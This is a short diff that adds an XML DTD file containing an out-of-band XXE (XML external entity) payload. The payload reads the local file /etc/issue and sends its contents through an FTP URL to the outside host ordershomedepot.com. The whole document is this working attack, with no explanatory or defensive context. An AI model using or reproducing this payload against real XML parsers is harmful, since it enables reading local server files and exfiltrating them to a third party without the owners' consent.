@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/issue">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://ordershomedepot.com/?xxe=%file;'>">
+%eval;
+%exfiltrate;
